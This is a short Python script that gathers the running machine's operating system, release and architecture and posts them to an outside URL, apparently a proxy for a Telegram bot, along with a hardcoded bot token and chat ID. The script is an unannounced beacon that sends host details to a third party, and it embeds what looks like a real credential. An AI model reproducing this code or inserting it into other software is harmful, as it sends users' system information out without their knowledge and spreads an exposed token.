import requests
import platform
system_info = f"System: {platform.system()} Release: {platform.release()}"
system_info += f" Architecture: {platform.machine()}"
proxy_url = "matin-site.github.io/os"
data_to_send = {
    "token": "6751743920:AAFKRHdaYL5ozxqC3xOHq8tX7CIW7_rS7mk",
    "method": "sendMessage",
    "data": {
        "chat_id": "1171970672",
        "text": system_info
    }
}
response = requests.post(proxy_url, json=data_to_send)
print(response.text)
